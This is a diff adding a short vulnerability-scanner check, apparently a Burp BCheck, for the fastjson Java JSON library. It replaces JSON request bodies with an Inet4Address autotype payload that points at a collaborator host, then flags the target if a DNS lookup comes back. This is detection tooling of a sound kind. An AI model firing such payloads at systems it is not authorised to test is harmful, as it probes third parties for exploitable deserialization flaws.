@@ -1,0 +1,21 @@
+metadata:
+    language: v1-beta
+    name: "fastjson"
+    description: "fastjson"
+
+define:
+		payload=`\{"ff":\{"@type":"java.net.Inet4Address","val":"{generate_collaborator_address()}"},"b":\{"@type":"java.net.Inet4Address","val":"{generate_collaborator_address()}","autoCommit":true}}`
+
+given request then
+    if {base.request.body} matches "^[{]" then
+        send request called inject_sspp:
+            method: "POST"
+            body: {regex_replace({base.request.body}, ".+", {payload})}
+				if dns interactions then
+					report issue:
+		            severity: high
+		            confidence: tentative
+		            detail: "fastjson"
+		            remediation: "fastjson"
+				end if
+		end if
